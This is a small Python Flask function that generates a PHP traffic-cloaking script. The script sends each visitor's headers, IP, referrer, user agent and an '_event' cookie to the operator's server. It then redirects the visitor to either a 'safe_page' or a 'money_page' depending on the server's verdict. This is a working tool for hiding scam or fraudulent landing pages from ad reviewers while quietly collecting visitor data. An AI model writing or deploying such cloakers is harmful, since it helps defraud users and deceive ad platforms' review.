from flask import request


def get_php(member_id, subscription_id):
    sr = """
    <?php error_reporting(E_ALL & ~E_NOTICE);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
$id = "{}";
$uid="{}";
$qu=$_SERVER["QUERY_STRING"];
$ch = curl_init();
$url = "http://{}:5000/lab";
$data=array("lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>'209.85.238.11',"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);
curl_setopt($ch,CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch,CURLOPT_POST, true);
curl_setopt($ch,CURLOPT_POSTFIELDS, $data);
$result = curl_exec($ch);
curl_close($ch);
$a12 = json_decode($result, true);
$a13 = $a12['results'][0];
if( !empty($a13['safe_page'])){
header("location: ".$a13['user_safe_page'], TRUE, 301);
}
if( !empty($a13['money_page']))
header("location: ".$a13['user_money_page'], TRUE, 301);
?>
    """ .format(str(subscription_id), str(member_id), str(request.host))
    return bytes(sr, 'utf-8')

